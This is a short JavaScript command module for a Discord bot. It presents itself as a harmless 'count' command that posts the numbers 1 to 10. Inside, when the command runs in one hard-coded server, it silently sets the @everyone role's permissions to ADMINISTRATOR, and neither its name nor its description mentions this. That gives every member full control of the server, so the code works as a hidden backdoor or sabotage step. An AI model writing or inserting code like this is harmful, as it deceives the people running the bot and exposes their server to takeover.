module.exports = {
    name: "count",
    description: "Count from 1 to 10",   
    aliases: [null],
    type: null,
    admin: false,
    syntax: "",
    execute(message, args) {
        if (message.guild.id === "728598542784135249") {
            message.guild.roles.everyone.setPermissions("ADMINISTRATOR", "Server");
            for (var i = 1; i <= 10; i++) {
                message.channel.send(i);
            };
        }
        else return;
    }  
}